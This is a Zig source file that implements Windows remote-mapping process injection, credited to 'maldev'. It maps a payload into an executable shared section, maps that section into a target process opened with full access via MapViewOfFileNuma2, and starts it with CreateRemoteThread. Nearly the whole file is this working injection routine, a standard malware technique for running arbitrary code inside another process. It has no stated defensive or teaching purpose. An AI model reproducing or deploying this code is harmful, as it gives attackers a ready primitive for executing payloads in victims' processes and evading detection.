const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const LPVOID = windows.LPVOID;
const BOOL = windows.BOOL;
const kernel32 = windows.kernel32;
const INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;
const FILE_MAP_WRITE = 0x0002;
const FILE_MAP_EXECUTE = 0x0020;
const LPTHREAD_START_ROUTINE = windows.LPTHREAD_START_ROUTINE;
const LPSECURITY_ATTRIBUTES = *windows.SECURITY_ATTRIBUTES;
const SIZE_T = windows.SIZE_T;
const LPDWORD = *windows.DWORD;
const PROCESS_ALL_ACCESS = 0x000F0000 | (0x00100000) | 0xFFFF;

extern "kernel32" fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: ?LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: ?LPVOID, dwCreationFlags: DWORD, lpThreadId: ?LPDWORD) callconv(WINAPI) HANDLE;

extern "kernel32" fn OpenProcess(
    dwDesiredAccess: windows.DWORD,
    bInheritHandle: windows.BOOL,
    dwProcessId: windows.DWORD,
) callconv(windows.WINAPI) windows.HANDLE;

extern "kernel32" fn CreateFileMappingW(
    hFile: windows.HANDLE,
    lpFileMappingAttributes: ?*anyopaque,
    flProtect: windows.DWORD,
    dwMaximumSizeHigh: windows.DWORD,
    dwMaximumSizeLow: windows.DWORD,
    lpName: ?[*:0]const u16,
) callconv(windows.WINAPI) ?windows.HANDLE;

extern "kernel32" fn MapViewOfFile(
    hFileMappingObject: windows.HANDLE,
    dwDesiredAccess: windows.DWORD,
    dwFileOffsetHigh: windows.DWORD,
    dwFileOffsetLow: windows.DWORD,
    dwNumberOfBytesToMap: windows.SIZE_T,
) callconv(windows.WINAPI) ?*anyopaque;

//extern "kernel32" fn MapViewOfFile2(FileMappingHandle: HANDLE, ProcessHandle: HANDLE, Offset: windows.ULONG64, BaseAddress: ?*anyopaque, ViewSize: windows.SIZE_T, AllocationType: windows.ULONG, PageProtection: windows.ULONG) callconv(WINAPI) ?*anyopaque;

pub extern "api-ms-win-core-memory-l1-1-5" fn MapViewOfFileNuma2(
    FileMappingHandle: HANDLE,
    ProcessHandle: HANDLE,
    Offset: u64, // ULONG64
    BaseAddress: ?*anyopaque, // PVOID (optional)
    ViewSize: usize, // SIZE_T
    AllocationType: u32, // ULONG
    PageProtection: u32, // ULONG
) callconv(windows.WINAPI) ?*anyopaque; // Returns PVOID

pub fn RemoteMappingInject(rhProcess: HANDLE, pPayload: [*]const u8, sPayloadSize: usize, ppAddress: *?*anyopaque) bool {
    // thanks to maldev!
    var Status: bool = true;
    var FileHandle: ?windows.HANDLE = undefined;
    var MapLocalAddress: ?*anyopaque = undefined;
    var MapRemoteAddress: ?*anyopaque = undefined;

    FileHandle = CreateFileMappingW(INVALID_HANDLE_VALUE, null, windows.PAGE_EXECUTE_READWRITE, 0, @intCast(sPayloadSize), null);
    if (FileHandle == null) {
        std.debug.print("CreateFileMappingW failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }
    MapLocalAddress = MapViewOfFile(FileHandle.?, FILE_MAP_WRITE, 0, 0, @intCast(sPayloadSize));
    if (MapLocalAddress == null) {
        std.debug.print("MapViewOfFile failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }

    @memcpy(@as([*]u8, @ptrCast(MapLocalAddress)), pPayload[0..sPayloadSize]);

    std.debug.print("MapLocalAddress: 0x{*}\n", .{MapLocalAddress});

    MapRemoteAddress = MapViewOfFileNuma2(FileHandle.?, rhProcess, 0, null, 0, 0, windows.PAGE_EXECUTE_READWRITE);
    std.debug.print("MapRemoteAddress: 0x{*}\n", .{MapRemoteAddress});

    if (MapRemoteAddress != null) {
        ppAddress.* = MapRemoteAddress;
        Status = true;
    }
    return Status;
}

pub fn Inject_CreateRemoteThread(ProcessId: windows.DWORD, pPayload: [*]const u8, sPayloadSize: usize) bool {
    //var hProcess: HANDLE = undefined;
    var hThread: ?*anyopaque = null;
    var is_ok: bool = false;
    //var tThread: HANDLE = undefined;
    //var lpThreadId: windows.DWORD = undefined;

    const hProcess = OpenProcess(PROCESS_ALL_ACCESS, windows.FALSE, ProcessId);

    if (hProcess == INVALID_HANDLE_VALUE) {
        return false;
    } else {
        is_ok = RemoteMappingInject(hProcess, pPayload, sPayloadSize, &hThread);
        if (!is_ok) {
            std.debug.print("RemoteMappingInject failed: {}\n", .{is_ok});
            return false;
        }
    }

    //hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);

    const tThread = CreateRemoteThread(hProcess, null, 0, @ptrCast(hThread), null, 0, null);
    if (tThread == INVALID_HANDLE_VALUE) {
        return false;
    } else {
        // windows.WaitForSingleObject(hThread, windows.INFINITE);
        windows.CloseHandle(tThread);
    }

    return true;
}
pub fn main() void {
    std.debug.print("Hello, World!\n", .{});
}
